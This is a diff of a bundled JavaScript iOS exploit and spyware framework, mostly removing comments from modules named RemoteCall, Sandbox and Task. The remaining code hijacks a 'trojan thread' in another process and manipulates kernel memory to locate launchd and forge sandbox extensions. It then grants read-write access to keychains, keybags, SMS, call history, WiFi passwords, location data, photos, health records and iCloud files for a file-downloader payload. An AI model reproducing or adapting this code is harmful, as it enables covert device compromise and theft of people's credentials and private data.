 		if (!_Exception__WEBPACK_IMPORTED_MODULE_5__["default"].waitException(this.#secondExceptionPort, excBuffer, newTimeout, false))
 		{
@@ -6009,7 +5738,7 @@ class RemoteCall
 		}
 		let excRes = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].read(excBuffer,Number(_Exception__WEBPACK_IMPORTED_MODULE_5__["default"].ExceptionMessageSize));
 		let exc = new _ExceptionMessageStruct__WEBPACK_IMPORTED_MODULE_6__["default"](excRes);
-		// Set the new state
+		
 		let newState = exc.threadState;
 		newState.registers.set(0,x0);
 		newState.registers.set(1,x1);
@@ -6023,13 +5752,13 @@ class RemoteCall
 		_Exception__WEBPACK_IMPORTED_MODULE_5__["default"].replyWithState(exc, newState, false);
 		exc.threadState.registers.set(0, x0);
 
-		// Don't wait for a new exception if timeout is < 0. Eg, when doing cleanup of trojan thread.
+		
 		if (timeout < 0)
 		{
 			console.log(TAG,`Trojan thread cleanup`);
 			return 0;
 		}
-		// Wait for the exception on LR corruption, so we can get return value of the call.
+		
 		if (!_Exception__WEBPACK_IMPORTED_MODULE_5__["default"].waitException(this.#secondExceptionPort, excBuffer, newTimeout, false))
 		{
 			console.log(TAG,`Don't receive second exception on new thread`);
@@ -6039,10 +5768,10 @@ class RemoteCall
 		exc = new _ExceptionMessageStruct__WEBPACK_IMPORTED_MODULE_6__["default"](excRes);
 		let retValue = exc.threadState.registers.get(0);
 	
-		// Corrupt again PC so we can control flow for the next call.
+		
 		newState = exc.threadState;
-		// Can be therotical used one previous implementation doesn't set LR
-		//signState(remoteCall->trojanThreadAddr, &newState, 0x101, 0);
+		
+		
 		_Exception__WEBPACK_IMPORTED_MODULE_5__["default"].replyWithState(exc, newState, false);
 	
 		return retValue;
@@ -6060,7 +5789,7 @@ class RemoteCall
 		x6 = 0n,
 		x7 = 0n)
 	{
-		//console.log(TAG, `call(${Utils.hex(pc)}, ${Utils.hex(x0)}, ${Utils.hex(x1)}, ${Utils.hex(x2)}, ${Utils.hex(x3)})`);
+		
 		return this.#doRemoteCallStable(timeout, pc, x0, x1, x2, x3, x4, x5, x6, x7);
 	}
 
@@ -6101,7 +5830,7 @@ class RemoteCall
 		src = BigInt(src);
 		size = BigInt(size);
 
-		//console.log(TAG, `read(): src=${Utils.hex(src)}, dst=${Utils.hex(dst)}, size=${size}`);
+		
 		let until = src + size;
 		while (src < until)
 		{
@@ -6116,7 +5845,7 @@ class RemoteCall
 				return false;
 			}
 	
-			//console.log(TAG,`remotePage: remote=${Utils.hex(remotePage.remoteAddress)}, local=${Utils.hex(remotePage.localAddress)}, port=${Utils.hex(remotePage.port)}`);
+			
 			libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("memcpy", dst, remotePage.localAddress + offs, copyCount);
 	
 			src += copyCount;
@@ -6136,7 +5865,7 @@ class RemoteCall
 
 		let until = dst + size;
 
-		//console.log(TAG, `write(): dst=${Utils.hex(dst)}, src=${Utils.hex(src)}, size=${size}`);
+		
 	
 		while (dst < until)
 		{
@@ -6151,7 +5880,7 @@ class RemoteCall
 				return false;
 			}
 	
-			//console.log(TAG,`remotePage: remote=${Utils.hex(remotePage.remoteAddress)}, local=${Utils.hex(remotePage.localAddress)}, offs=${offs}, length=${copyCount}, port=${Utils.hex(remotePage.port)}`);
+			
 			libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("memcpy", remotePage.localAddress + offs, src, copyCount);
 	
 			dst += copyCount;
@@ -6164,7 +5893,7 @@ class RemoteCall
 	{
 		if (!str)
 			return false;
-		//return this.write(dst, Native.getCString(str), str.length + 1);
+		
 		let mem = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("malloc", str.length + 1);
 		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].writeString(mem, str);
 		const ret = this.write(dst, mem, str.length + 1);
@@ -6202,7 +5931,7 @@ class RemoteCall
 
 	insertRight(port, right)
 	{
-		//console.log(TAG, "Insert right: " + Utils.hex(port));
+		
 
 		const MACH_MSG_TYPE_COPY_SEND = 19;
 
@@ -6223,7 +5952,7 @@ class RemoteCall
 			return 0;
 		}
 		
-		//TODO receive in remote task
+		
 		msg.msgh_size = 0x100;
 		msg.msgh_local_port = this.#remotePort;
 		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].write(libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem, msgBuff);
@@ -6240,15 +5969,15 @@ class RemoteCall
 		this.read(this.#trojanMem, libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem + 0x100n, 24);
 		let recvBuff = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].read(libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem + 0x100n, 24);
 		let recvMsg = new _MachMsgHeaderStruct__WEBPACK_IMPORTED_MODULE_11__["default"](recvBuff);
-		//console.log(TAG, "Recv msg id: " + Utils.hex(recvMsg.msgh_id));
-		//console.log(TAG, "Recv remote port: " + Utils.hex(recvMsg.msgh_remote_port));
+		
+		
 
 		ret = this.#doRemoteCallStable(100, "fileport_makefd", recvMsg.msgh_remote_port);
 		if (ret < 0) {
 			console.log(TAG, "insertRight: error with fileport_makefd");
 			return 0;
 		}
-		//console.log(TAG, "Remote fileport_makefd: " + ret);
+		
 
 		return ret;
 	}
@@ -6259,7 +5988,7 @@ class RemoteCall
 		{
 			if (!this.#shmemCache[i])
 			{
-				// TODO encapsulate this inside shmem struct
+				
 				let shmemBuff = new ArrayBuffer(0x18);
 				this.#shmemCache[i] = new _VMShmem__WEBPACK_IMPORTED_MODULE_10__["default"](shmemBuff);
 				this.#shmemCache[i].port = shmem.port;
@@ -6276,19 +6005,19 @@ class RemoteCall
 		let remotePage = this.#getShmemFromCache(pageAddr);
 		if (!remotePage)
 		{
-			//console.log(TAG, `Page not found in cache: ${Utils.hex(pageAddr)}`);
+			
 			let newRemotePage = _VM__WEBPACK_IMPORTED_MODULE_9__["default"].mapRemotePage(this.#vmMap, pageAddr);
 			if (!newRemotePage || !newRemotePage.localAddress)
 				return false;
 			return this.#putShmemInCache(newRemotePage);
 		}
-		//console.log(TAG, `Page found in cache: ${Utils.hex(pageAddr)}`);
+		
 		return remotePage;
 	}
 
 	#getShmemFromCache(pageAddr)
 	{
-		//console.log(TAG,`getShmemFromCache(): pageAddr=${Utils.hex(pageAddr)}`);
+		
 		for (let i=0; i<SHMEM_CACHE_SIZE; i++)
 		{
 			if(this.#shmemCache[i])
@@ -6322,24 +6051,22 @@ class RemoteCall
 	}
 }
 
-/***/ }),
+ }),
 
-/***/ "./src/libs/TaskRop/Sandbox.js":
-/*!*************************************!*\
-  !*** ./src/libs/TaskRop/Sandbox.js ***!
-  \*************************************/
-/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {
+ "./src/libs/TaskRop/Sandbox.js":
+
+ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {
 
 __webpack_require__.r(__webpack_exports__);
-/* harmony export */ __webpack_require__.d(__webpack_exports__, {
-/* harmony export */   "default": () => (/* binding */ Sandbox)
-/* harmony export */ });
-/* harmony import */ var libs_JSUtils_FileUtils__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! libs/JSUtils/FileUtils */ "./src/libs/JSUtils/FileUtils.js");
-/* harmony import */ var libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! libs/JSUtils/Utils */ "./src/libs/JSUtils/Utils.js");
-/* harmony import */ var _Task__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! ./Task */ "./src/libs/TaskRop/Task.js");
-/* harmony import */ var _RemoteCall__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__(/*! ./RemoteCall */ "./src/libs/TaskRop/RemoteCall.js");
-/* harmony import */ var libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_4__ = __webpack_require__(/*! libs/Chain/Chain */ "./src/libs/Chain/Chain.js");
-/* harmony import */ var libs_Chain_Native__WEBPACK_IMPORTED_MODULE_5__ = __webpack_require__(/*! libs/Chain/Native */ "./src/libs/Chain/Native.js");
+ __webpack_require__.d(__webpack_exports__, {
+   "default": () => ( Sandbox)
+ });
+ var libs_JSUtils_FileUtils__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__( "./src/libs/JSUtils/FileUtils.js");
+ var libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__( "./src/libs/JSUtils/Utils.js");
+ var _Task__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__( "./src/libs/TaskRop/Task.js");
+ var _RemoteCall__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__( "./src/libs/TaskRop/RemoteCall.js");
+ var libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_4__ = __webpack_require__( "./src/libs/Chain/Chain.js");
+ var libs_Chain_Native__WEBPACK_IMPORTED_MODULE_5__ = __webpack_require__( "./src/libs/Chain/Native.js");
 
 
 
@@ -6353,7 +6080,7 @@ class Sandbox {
 
 	static #launchdTask = null;
 	static #PathDictionary = {
-		// Communications
+		
 		"/private/var/mobile/Library/AddressBook/":0,
 		"/private/var/mobile/Library/CallHistoryDB/":0,
 		"/private/var/mobile/Library/DoNotDisturb/":0,
@@ -6363,18 +6090,18 @@ class Sandbox {
 		"/private/var/mobile/Library/Voicemail/":0,
 		"/var/mobile/Library/Recordings":0,
 		
-		// Location
+		
 		"/private/var/root/Library/Caches/locationd":0,
 		"/private/var/root/Library/Caches/locationd/":0,
 		"/private/var/mobile/Library/Caches/locationd/":0,
 		"/private/var/mobile/Library/Caches/com.apple.routined/":0,
 		
-		// Browser & Cookies
+		
 		"/private/var/mobile/Library/Safari/":0,
 		"/private/var/mobile/Library/Cookies/":0,
 		"/private/var/mobile/Cookies/":0,
 		
-		// Credentials & WiFi
+		
 		"/private/var/Keychains/":0,
 		"/var/Keychains/":0,
 		"/private/var/keybags/":0,
@@ -6416,7 +6143,7 @@ class Sandbox {
 		"/var/run/":0,
 		"/private/var/run/":0,
 		
-		// Personal Data
+		
 		"/private/var/mobile/Library/Notes/":0,
 		"/private/var/mobile/Library/Health/":0,
 		"/private/var/mobile/Media/":0,
@@ -6426,20 +6153,20 @@ class Sandbox {
 		"/var/mobile/Media/PhotoData/":0,
 		"/var/mobile/Media/DCIM/":0,
 		
-		// Device Info
+		
 		"/private/var/root/Library/Lockdown/":0,
 		"/private/var/mobile/Library/Preferences/":0,
 		"/private/var/mobile/Library/Preferences/com.apple.commcenter.shared.plist":0,
 		"/private/var/mobile/Library/Preferences/com.apple.identityservices.idstatuscache.plist":0,
 		
-		// Accounts
+		
 		"/private/var/mobile/Library/Accounts/":0,
 		
-		// Protected & Trust
+		
 		"/private/var/protected/trustd/private/":0,
 		"/private/var/protected/trustd/private":0,
 		
-		// System & Apps
+		
 		"/bin/":0,
 		"/Applications/":0,
 		"/private/var/containers/Bundle/Application/":0,
@@ -6449,21 +6176,17 @@ class Sandbox {
 		"/var/mobile/Containers/Data/Application/":0,
 		"/private/var/mobile/Containers/Shared/AppGroup/":0,
 		
-		// Notifications & Logs
+		
 		"/private/var/mobile/Library/UserNotificationsUI/NotificationListPersistentState.json":0,
 		"/private/var/mobile/Library/UserNotifications/":0,
 		"/private/var/mobile/Library/Logs/CrashReporter/":0,
 		"/private/var/mobile/Library/ExternalAccessory":0,
 		"/private/var/mobile/Library/Shortcuts/":0,
 		
-		// Temp directory for file operations
+		
 		"/private/var/tmp/":0,
 		"/tmp/":0
-		/* not allowed via launchd
-		"/private/var/mobile/Library/CoreDuet/Knowledge/knowledgeC.db":0,
-		"/private/var/mobile/Library/CoreDuet/Knowledge/knowledgeC.db-wal":0,
-		"/private/var/mobile/Library/CoreDuet/Knowledge/knowledgeC.db-shm":0
-		*/
+		
 	};
 
 	static initWithLaunchdTask(launchdTask) {
@@ -6476,7 +6199,7 @@ class Sandbox {
 		if (!this.#launchdTask || !this.#launchdTask.success())
 			return;
 
-		//console.log(TAG,`Creating token for path:${path}`);
+		
 		let memRemote = this.#launchdTask.mem();
 		let pathRemote = memRemote;
 		this.#launchdTask.writeStr(pathRemote,path);
@@ -6488,13 +6211,13 @@ class Sandbox {
 			console.log(TAG, "Unable to create token for: " + path);
 			return null;
 		}
-		//console.log(TAG,`token:${Utils.hex(tokenRemote)}`);
+		
 		let token = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_5__["default"].mem;
 		this.#launchdTask.read(tokenRemote,token,512n);
 		if(consume)
 			libs_Chain_Native__WEBPACK_IMPORTED_MODULE_5__["default"].callSymbol("sandbox_extension_consume",token);
 		token = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_5__["default"].readString(token,512);
-		//console.log(TAG,`token:${token}`);
+		
 		if(!token || !token.includes("com.apple.app-sandbox.read-write"))
 		{
 			console.log(TAG,`Found weird token:${token}, not registering`);
@@ -6510,8 +6233,8 @@ class Sandbox {
 		for(let key of keys)
 			this.#PathDictionary[key] = this.getTokenForPath(key,false);
 
-		// Those are required for Bailer
-		//if (!this.#weAreLaunchd) {
+		
+		
 			this.getTokenForPath("/bin/", true);
 			this.getTokenForPath("/Applications/", true);
 			this.getTokenForPath("/private/var/tmp/", true);
@@ -6527,37 +6250,37 @@ class Sandbox {
 			this.getTokenForPath("/private/var/protected/trustd/private/TrustStore.sqlite3", true);
 			this.getTokenForPath("/private/var/protected/trustd/private/TrustStore.sqlite3-wal", true);
 			this.getTokenForPath("/private/var/protected/trustd/private/TrustStore.sqlite3-shm", true);
-		//}
 		
-		// Forensic file paths for file_downloader payload
+		
+		
 		console.log(TAG, "Create tokens for forensic paths...");
 		this.getTokenForPath("/private/var/mobile/Library/SMS/", true);
 		this.getTokenForPath("/private/var/mobile/Library/CallHistoryDB/", true);
 		this.getTokenForPath("/private/var/mobile/Library/AddressBook/", true);
 		this.getTokenForPath("/private/var/mobile/Library/Voicemail/", true);
 		
-		// Keychain tokens (with /private prefix)
+		
 		this.getTokenForPath("/private/var/Keychains/", true);
 		this.getTokenForPath("/private/var/Keychains/keychain-2.db", true);
 		this.getTokenForPath("/private/var/Keychains/keychain-2.db-shm", true);
 		this.getTokenForPath("/private/var/Keychains/keychain-2.db-wal", true);
 		this.getTokenForPath("/private/var/Keychains/keychain-2.db-journal", true);
 		
-		// Keychain tokens (without /private prefix - alternate)
+		
 		this.getTokenForPath("/var/Keychains/", true);
 		this.getTokenForPath("/var/Keychains/keychain-2.db", true);
 		this.getTokenForPath("/var/Keychains/keychain-2.db-shm", true);
 		this.getTokenForPath("/var/Keychains/keychain-2.db-wal", true);
 		this.getTokenForPath("/var/Keychains/keychain-2.db-journal", true);
 		
-		// Keybag tokens (legacy location)
+		
 		this.getTokenForPath("/private/var/keybags/", true);
 		this.getTokenForPath("/private/var/keybags/systembag.kb", true);
 		this.getTokenForPath("/private/var/keybags/persona.kb", true);
 		this.getTokenForPath("/private/var/keybags/usersession.kb", true);
 		this.getTokenForPath("/private/var/keybags/backup/", true);
 		
-		// Keybag tokens (without /private - alternate)
+		
 		this.getTokenForPath("/var/keybags/", true);
 		this.getTokenForPath("/var/keybags/systembag.kb", true);
 		this.getTokenForPath("/var/keybags/persona.kb", true);
@@ -6565,7 +6288,7 @@ class Sandbox {
 		this.getTokenForPath("/var/keybags/backup/", true);
 		this.getTokenForPath("/var/keybags/backup/backup_keys_cache.sqlite", true);
 		
-		// Keybag tokens (Keychains directory - iOS 18)
+		
 		this.getTokenForPath("/private/var/Keychains/System.keybag", true);
 		this.getTokenForPath("/private/var/Keychains/Backup.keybag", true);
 		this.getTokenForPath("/private/var/Keychains/persona.kb", true);
@@ -6577,7 +6300,7 @@ class Sandbox {
 		this.getTokenForPath("/private/var/preferences/SystemConfiguration/com.apple.wifi-private-mac-networks.plist", true);
 		this.getTokenForPath("/private/var/preferences/com.apple.wifi.known-networks.plist", true);
 		
-		// WiFi password file locations (for pickup from wifid)
+		
 		this.getTokenForPath("/var/wireless/", true);
 		this.getTokenForPath("/private/var/wireless/", true);
 		this.getTokenForPath("/private/var/wireless/Library/", true);
@@ -6604,7 +6327,7 @@ class Sandbox {
 		this.getTokenForPath("/private/var/mobile/Media/DCIM/", true);
 		this.getTokenForPath("/var/mobile/Media/", true);
 		
-		// iCloud Drive tokens
+		
 		this.getTokenForPath("/private/var/mobile/Library/Mobile Documents/", true);
 		this.getTokenForPath("/private/var/mobile/Library/Mobile Documents/com~apple~CloudDocs/", true);
 		this.getTokenForPath("/var/mobile/Media/PhotoData/", true);
@@ -6625,10 +6348,10 @@ class Sandbox {
 		{
 			if(this.#PathDictionary[key])
 			{
-				//console.log(TAG,`Applying:${this.#PathDictionary[key]}`);
+				
 				remoteTask.writeStr(remoteMem,this.#PathDictionary[key]);
 				remoteTask.call(100,"sandbox_extension_consume",remoteMem);
-				//console.log(TAG,`Result of consume:${resConsume}`);
+				
 			}
 		}
 	}
@@ -6675,10 +6398,10 @@ class Sandbox {
 		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_5__["default"].writeString(randomHexPtr, randomHex);
 		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_5__["default"].callSymbol("strcat", write_file_path, randomHexPtr);
 
-		// mktmp should work
-		// confstrr path
-		// also in pe
-		//let procPath = "/private/var/tmp/com.apple.mediaplaybackd/Library/HTTPStorages/com.apple.mediaplaybackd/"
+		
+		
+		
+		
 		let appSandboxReadExt = "com.apple.app-sandbox.read-write";
 		let extension = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_5__["default"].callSymbol("sandbox_extension_issue_file",appSandboxReadExt,write_file_path,0n,0n);
 		if (!extension) {
@@ -6724,31 +6447,24 @@ class Sandbox {
 			return false;
 		}
 		console.log(TAG,`ext_setAddr:${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].hex(ext_setAddr)}`);
-		let ext_tableAddr = ext_setAddr + 0x0n; // koffsetof(extension_set, ext_table) = 0x0
+		let ext_tableAddr = ext_setAddr + 0x0n; 
 		let hash = 0n;
 		console.log(TAG,`hash:${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].hex(hash)}`);
-		//hash = 4n; // for read
-		hash = 0n; // for read-write
+		
+		hash = 0n; 
 		let ext_hdrAddr = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_4__["default"].read64(ext_tableAddr + hash * BigInt(libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].UINT64_SIZE));
 		if (ext_hdrAddr == 0n) {
 			console.log(TAG,`Sandbox failure 8`);
 			return false;
 		}
-		/*
-		newHash = hashing_magic(appSandboxReadWriteExt);
-		LOG("ext_hdrAddr:%llx",ext_hdrAddr);
-		sleep(1);
-		mach_vm_address_t nullAddr = 0;
-		chain_write(ext_tableAddr + hash * sizeof(mach_vm_address_t),&nullAddr,sizeof(nullAddr));
-		chain_write(ext_tableAddr + newHash * sizeof(mach_vm_address_t),&ext_hdrAddr,sizeof(ext_hdrAddr));
-		*/
+		
 		for (;;) {
 			let nextAddr = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_4__["default"].read64(ext_hdrAddr);
 			if(nextAddr == 0n)
 				break;
 			ext_hdrAddr = nextAddr;
 		}
-		let ext_lstAddr = ext_hdrAddr + 0x8n; // koffsetof(extension_hdr, ext_lst) == 0x8
+		let ext_lstAddr = ext_hdrAddr + 0x8n; 
 		let extAddr = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_4__["default"].read64(ext_lstAddr);
 		if (extAddr == 0n) {
 			console.log(TAG,`Sandbox failure 9`);
@@ -6774,18 +6490,16 @@ class Sandbox {
 }
 
 
-/***/ }),
+ }),
 
-/***/ "./src/libs/TaskRop/SelfTaskStruct.js":
-/*!********************************************!*\
-  !*** ./src/libs/TaskRop/SelfTaskStruct.js ***!
-  \********************************************/
-/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {
+ "./src/libs/TaskRop/SelfTaskStruct.js":
+
+ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {
 
 __webpack_require__.r(__webpack_exports__);
-/* harmony export */ __webpack_require__.d(__webpack_exports__, {
-/* harmony export */   "default": () => (/* binding */ SelfTaskStruct)
-/* harmony export */ });
+ __webpack_require__.d(__webpack_exports__, {
+   "default": () => ( SelfTaskStruct)
+ });
 class SelfTaskStruct 
 {
 	#buffer;
@@ -6833,22 +6547,20 @@ class SelfTaskStruct
 	}
 }
 
-/***/ }),
+ }),
 
-/***/ "./src/libs/TaskRop/Task.js":
-/*!**********************************!*\
-  !*** ./src/libs/TaskRop/Task.js ***!
-  \**********************************/
-/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {
+ "./src/libs/TaskRop/Task.js":
+
+ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {
 
 __webpack_require__.r(__webpack_exports__);
-/* harmony export */ __webpack_require__.d(__webpack_exports__, {
-/* harmony export */   "default": () => (/* binding */ Task)
-/* harmony export */ });
-/* harmony import */ var _SelfTaskStruct__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! ./SelfTaskStruct */ "./src/libs/TaskRop/SelfTaskStruct.js");
-/* harmony import */ var libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! libs/JSUtils/Utils */ "./src/libs/JSUtils/Utils.js");
-/* harmony import */ var libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! libs/Chain/Chain */ "./src/libs/Chain/Chain.js");
-/* harmony import */ var libs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__(/*! libs/Chain/Native */ "./src/libs/Chain/Native.js");
+ __webpack_require__.d(__webpack_exports__, {
+   "default": () => ( Task)
+ });
+ var _SelfTaskStruct__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__( "./src/libs/TaskRop/SelfTaskStruct.js");
+ var libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__( "./src/libs/JSUtils/Utils.js");
+ var libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__( "./src/libs/Chain/Chain.js");
+ var libs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__( "./src/libs/Chain/Native.js");
 
 
 
@@ -6870,14 +6582,10 @@ class Task
 
 	static init(selfTaskAddr)
 	{
-		// Update KALLOC_ARRAY_TYPE_SHIFT
+		
 		this.KALLOC_ARRAY_TYPE_SHIFT = BigInt((64n - libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].offsets().T1SZ_BOOT - 1n));
 
-		/*
-		 * This function should be invoked as the initializer of the this Task utility.
-		 * It setups the global var "gSelfTask" containing values used all across the task functions to lookup ports.
-		 * It also retrieves the "launchd" task address.
-		 */
+		
 		this.gSelfTask.addr = selfTaskAddr;
 		let spaceTable = this.#getSpaceTable(this.gSelfTask.addr);
 		this.gSelfTask.portObject = this.#getPortObject(spaceTable, 0x203n);
@@ -6941,12 +6649,12 @@ class Task
 
 	static disableExcGuardKill(taskAddr)
 	{
-		// in mach_port_guard_ast, the victim would crash if these are on.
+		
 		let excGuard = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].read32(taskAddr + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].offsets().excGuard);
-		//console.log(TAG,`Current excGuard:0x${Utils.hex(excGuard)}`);
+		
 		excGuard &= ~(TASK_EXC_GUARD_MP_CORPSE | TASK_EXC_GUARD_MP_FATAL);
 		excGuard |= TASK_EXC_GUARD_MP_DELIVER;
-		//console.log(TAG,`ExcGuard result:0x${Utils.hex(excGuard)}`);
+		
 		libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].write32(taskAddr + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].offsets().excGuard, excGuard);
 	}
 
@@ -6959,10 +6667,10 @@ class Task
 			let command = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__["default"].mem;
 			libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].read(procAddr + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].offsets().pComm, command, 18);
 			let resultName = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__["default"].readString(command,18);
-			//console.log(TAG, `${Utils.hex(procAddr)}: ${resultName}`);
+			
 			if(name === resultName)
 			{
-				//console.log(TAG, `Found target process: ${name}`);
+				
 				return currTask;
 			}
 			let nextTask = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].read64(currTask + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].offsets().nextTask);
@@ -6983,10 +6691,10 @@ class Task
 	{
 		let space = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].read64(taskAddr + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].offsets().ipcSpace);
 		let spaceTable = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].read64(space + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].offsets().spaceTable);
-		//console.log(TAG,`space: ${Utils.hex(space)}`);
-		//console.log(TAG,`spaceTable: ${Utils.hex(spaceTable)}`);
+		
+		
 		spaceTable = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].strip(spaceTable);
-		//console.log(TAG,`spaceTable: ${Utils.hex(spaceTable)}`);
+		
 		return this.#kallocArrayDecodeAddr(BigInt(spaceTable));
 	}
 
@@ -7003,11 +6711,11 @@ class Task
 
 	static #getPortObject(spaceTable, port)
 	{
-		//console.log(TAG, `getPortObject(): space=${Utils.hex(spaceTable)}, port=${Utils.hex(port)}`);
+		
 		let portEntry = this.#getPortEntry(spaceTable, port);
-		//console.log(TAG,`portEntry: ${Utils.hex(portEntry)}`);
+		
 		let portObject = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].read64(portEntry + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].offsets().entryObject);
-		//console.log(TAG,`portObject:${Utils.hex(portObject)}`);
+		
 		return libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].strip(portObject);
 	}
 
@@ -7020,9 +6728,7 @@ class Task
 
 	static #searchForLaunchdTask()
 	{
-		/*
-		 * Traverse the tasks list backwards starting from the self task until we find the proc with PID 1.
-		 */
+		
 
 		let currTask = this.gSelfTask.addr;
 		while (true)
@@ -7049,9 +6755,9 @@ class Task
 		else
 		{
 			ptr &= ~libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].PAGE_MASK;
-			//console.log(TAG,`ptr:${Utils.hex(ptr)}`);
+			
 			ptr |= zone_mask;
-			//console.log(TAG,`ptr2:${Utils.hex(ptr)}`);
+			
 		}
 		return ptr;
 	}
@@ -7104,21 +6810,19 @@ class Task
 }
 
 
-/***/ }),
+ }),
 
-/***/ "./src/libs/TaskRop/TaskRop.js":
-/*!*************************************!*\
-  !*** ./src/libs/TaskRop/TaskRop.js ***!
-  \*************************************/
-/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {
+ "./src/libs/TaskRop/TaskRop.js":
+
+ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {
 
 __webpack_require__.r(__webpack_exports__);
-/* harmony export */ __webpack_require__.d(__webpack_exports__, {
-/* harmony export */   "default": () => (/* binding */ TaskRop)
-/* harmony export */ });
-/* harmony import */ var libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! libs/Chain/Chain */ "./src/libs/Chain/Chain.js");
-/* harmony import */ var libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! libs/JSUtils/Utils */ "./src/libs/JSUtils/Utils.js");
-/* harmony import */ var _Task__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! ./Task */ "./src/libs/TaskRop/Task.js");
+ __webpack_require__.d(__webpack_exports__, {
+   "default": () => ( TaskRop)
+ });
+ var libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__( "./src/libs/Chain/Chain.js");
+ var libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__( "./src/libs/JSUtils/Utils.js");
+ var _Task__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__( "./src/libs/TaskRop/Task.js");
 
 
 
@@ -7140,22 +6844,20 @@ class TaskRop
 	}
 }
 
-/***/ }),
+ }),
 
-/***/ "./src/libs/TaskRop/Thread.js":
-/*!************************************!*\
-  !*** ./src/libs/TaskRop/Thread.js ***!
-  \************************************/
-/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {
+ "./src/libs/TaskRop/Thread.js":
+
+ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {
 
 __webpack_require__.r(__webpack_exports__);
-/* harmony export */ __webpack_require__.d(__webpack_exports__, {
-/* harmony export */   "default": () => (/* binding */ Thread)
-/* harmony export */ });
-/* harmony import */ var libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! libs/Chain/Chain */ "./src/libs/Chain/Chain.js");
-/* harmony import */ var libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! libs/JSUtils/Utils */ "./src/libs/JSUtils/Utils.js");
-/* harmony import */ var _ThreadState__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! ./ThreadState */ "./src/libs/TaskRop/ThreadState.js");
